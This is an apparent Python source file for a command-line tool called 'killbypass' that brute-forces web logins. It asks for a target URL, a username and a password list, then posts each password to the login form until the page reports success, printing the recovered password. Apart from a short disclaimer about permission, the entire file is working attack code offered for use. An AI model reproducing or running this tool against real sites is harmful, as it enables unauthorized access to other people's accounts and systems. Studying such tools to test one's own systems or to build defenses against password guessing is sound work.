import requests
from pyfiglet import Figlet
import argparse
import art as a
from termcolor import colored

print(colored(a.art, 'green')) 
f = Figlet(font='slant')
print(colored(f.renderText('killbypass'), 'green'))  

# Print disclaimer by harishkumar 
print(colored("DISCLAIMER: This tool is for educational purposes only. Unauthorized attempts to access a system are illegal. Always ensure you have permission to perform these actions on the website.", 'red')) 

while True:
    print("1. Perform attack")
    print("00. Exit")
    choice = input("Enter your choice: ")

    if choice == '1':
        # Ask the user for input
        url = input('Enter the target URL: ')
        username = input('Enter the username: ')
        password_file = input('Enter the path to the password file: ')

        parser = argparse.ArgumentParser(description='Brute Force Tool')

      
        parser.add_argument('url', metavar='url', type=str, help='the target URL')
        parser.add_argument('username', metavar='username', type=str, help='the username')
        parser.add_argument('password_file', metavar='password_file', type=str, help='the path to the password file')

        args = parser.parse_args([url, username, password_file])
        try:
            with open(args.password_file, 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError:
            print(f'Error: The file {args.password_file} does not exist.')
            exit(1)

        # Try each password in tool
        for password in passwords:
            data = {'username': args.username, 'password': password}
            try:
                response = requests.post(args.url, data=data)
            except requests.exceptions.RequestException as e:
                print(f'Error: An error occurred while making the request: {e}')
                exit(1)

            if 'Login Successful' in response.text:
                print(colored(f'Success! The password is: {password}','yellow'))
                break
            else:
                print(f'Failed with password: {password}')
                print("Form data:", data)
      

    elif choice == '00':
        print("Exiting...")
        break

    else:
        print("Invalid choice. Please enter 1 to perform an attack or 00 to exit.")

